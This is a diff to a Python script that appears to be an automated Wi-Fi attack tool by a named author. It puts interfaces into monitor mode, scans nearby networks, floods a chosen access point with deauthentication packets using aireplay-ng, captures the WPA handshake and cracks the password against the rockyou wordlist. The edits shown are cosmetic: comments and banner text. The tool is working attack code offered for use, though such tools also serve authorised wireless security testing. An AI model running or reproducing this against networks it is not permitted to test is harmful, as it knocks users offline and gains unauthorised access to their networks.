@@ -6,15 +6,15 @@ import re
 import csv
 from colorama import init, Fore, Style
 
-# Initialize colorama for colored output
+# Initialize colorama
 init()
 
-# Ensure script runs with root privileges
+# Ensure script run as root
 if os.geteuid() != 0:
     print(f"{Fore.RED}{Style.BRIGHT}[-] This script must be run as root. Use sudo.{Style.RESET_ALL}")
     exit(1)
 
-# Function to list available Wi-Fi interfaces (excluding those starting with wlan)
+# List available WiFi interfaces
 def list_wifi_interfaces():
     result = subprocess.run(['iwconfig'], capture_output=True, text=True)
     interfaces = re.findall(r'^((?!wlan)\w+)', result.stdout, re.MULTILINE)
@@ -25,7 +25,7 @@ def list_wifi_interfaces():
             wifi_interfaces.append(iface)
     return wifi_interfaces
 
-# Function to enable monitor mode
+# Enable monitor mode
 def enable_monitor_mode(interface):
     print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Checking and enabling monitor mode on {interface}...{Style.RESET_ALL}")
     subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)
@@ -42,7 +42,7 @@ def enable_monitor_mode(interface):
     print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to enable monitor mode on {interface}.{Style.RESET_ALL}")
     exit(1)
 
-# Function to scan for Wi-Fi networks
+# Scan networks
 def scan_wifi_networks(interface):
     print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Scanning for Wi-Fi networks on {interface} (10 seconds)...{Style.RESET_ALL}")
     csv_file = "wifi_scan-01.csv"
@@ -74,7 +74,7 @@ def scan_wifi_networks(interface):
         return []
     return sorted(networks, key=lambda x: int(x["Signal"]), reverse=True)
 
-# Function to perform deauthentication attack
+# Deauthentication attack
 def deauth_attack(interface, bssid, count=50):
     print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Performing deauth attack on BSSID: {bssid}...{Style.RESET_ALL}")
     proc = subprocess.Popen(['aireplay-ng', '--deauth', str(count), '-a', bssid, interface])
@@ -82,7 +82,7 @@ def deauth_attack(interface, bssid, count=50):
     proc.terminate()
     print(f"{Fore.GREEN}{Style.BRIGHT}[+] Sent {count} deauth packets.{Style.RESET_ALL}")
 
-# Function to capture WPA handshake
+# Capture handshake
 def capture_handshake(interface, bssid, channel):
     print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Capturing WPA handshake for {bssid} on channel {channel}...{Style.RESET_ALL}")
     subprocess.run(['iwconfig', interface, 'channel', channel])
@@ -96,7 +96,7 @@ def capture_handshake(interface, bssid, channel):
     print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to capture handshake.{Style.RESET_ALL}")
     return None
 
-# Function to crack WPA password
+# Crack password
 def crack_password(cap_file, bssid, wordlist="/usr/share/wordlists/rockyou.txt"):
     if not os.path.exists(wordlist):
         print(f"{Fore.RED}{Style.BRIGHT}[-] Wordlist {wordlist} not found.{Style.RESET_ALL}")
@@ -111,7 +111,7 @@ def crack_password(cap_file, bssid, wordlist="/usr/share/wordlists/rockyou.txt")
     print(f"{Fore.RED}{Style.BRIGHT}[-] Password not found in wordlist.{Style.RESET_ALL}")
     return None
 
-# Main function with debug prints
+# Main function
 def main():
     mon_interface = None
     try:
@@ -120,7 +120,7 @@ def main():
             print(f"{Fore.RED}{Style.BRIGHT}[-] No Wi-Fi interfaces found (excluding wlan*).{Style.RESET_ALL}")
             exit(1)
         print(f"{Fore.CYAN}{Style.BRIGHT}Available Wi-Fi interfaces: {interfaces}{Style.RESET_ALL}")
-        # Validate interface selection
+        #? Validate interface selection
         while True:
             selected_interface = input(f"{Fore.CYAN}{Style.BRIGHT}Select an interface: {Style.RESET_ALL}")
             print(f"{Fore.YELLOW}[DEBUG] User entered interface: '{selected_interface}'{Style.RESET_ALL}")
@@ -139,7 +139,7 @@ def main():
         for i, net in enumerate(networks):
             print(f"{Fore.WHITE}{Style.BRIGHT}{i:<4} {net['BSSID']:<17} {net['ESSID']:<18} {net['Channel']:<7} {net['Encryption']:<11} {net['Signal']} dBm{Style.RESET_ALL}")
 
-        # Robust input validation for network selection
+        #? Robust input validation for network selection
         print(f"{Fore.YELLOW}[DEBUG] Entering network selection loop{Style.RESET_ALL}")
         while True:
             user_input = input(f"\n{Fore.CYAN}{Style.BRIGHT}Select a network by index (0-{len(networks)-1}): {Style.RESET_ALL}")
@@ -177,13 +177,10 @@ def main():
         subprocess.run(['sudo', 'service', 'NetworkManager', 'start'], stdout=subprocess.DEVNULL)
         print(f"{Fore.YELLOW}{Style.BRIGHT}[*] NetworkManager restarted.{Style.RESET_ALL}")
 
+
 if __name__ == "__main__":
     
-    subprocess.run('clear', stdout=subprocess.DEVNULL)
-    print()
-    print()
-    print()
-    print()
+    subprocess.run('clear')
     print()
     print(f"{Fore.MAGENTA}{Style.BRIGHT} █████   ███   █████  ███  ███████████            ███               █████{Style.RESET_ALL}")
     print(f"{Fore.MAGENTA}{Style.BRIGHT}░░███   ░███  ░░███  ░░░  ░░███░░░░░░█           ░░░               ░░███ {Style.RESET_ALL}")
@@ -193,7 +190,10 @@ if __name__ == "__main__":
     print(f"{Fore.MAGENTA}{Style.BRIGHT}  ░░░█████░█████░    ░███  ░███  ░     ░███      ░███ ░███░░░  ░███ ░███ {Style.RESET_ALL}")
     print(f"{Fore.MAGENTA}{Style.BRIGHT}    ░░███ ░░███      █████ █████       █████     █████░░██████ ░░████████{Style.RESET_ALL}")
     print(f"{Fore.MAGENTA}{Style.BRIGHT}     ░░░   ░░░      ░░░░░ ░░░░░       ░░░░░     ░░░░░  ░░░░░░   ░░░░░░░░ {Style.RESET_ALL}")
-    print(f"{Fore.CYAN}{Style.BRIGHT}[+] Creator: Pavin Das{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}{Style.BRIGHT}[+] GitHub: PavinDas{Style.RESET_ALL}")
-    print(f"{Fore.MAGENTA}{Style.BRIGHT}[+] Instagram: pavin__das{Style.RESET_ALL}")
+    print()
+    print(f"{Fore.LIGHTRED_EX}{Style.BRIGHT}[+]  Creator    :  Pavin Das{Style.RESET_ALL}")
+    print(f"{Fore.LIGHTRED_EX}{Style.BRIGHT}[+]  GitHub     :  PavinDas{Style.RESET_ALL}")
+    print(f"{Fore.LIGHTRED_EX}{Style.BRIGHT}[+]  Instagram  :  pavin__das{Style.RESET_ALL}")
+    print()
+    print()
     main()
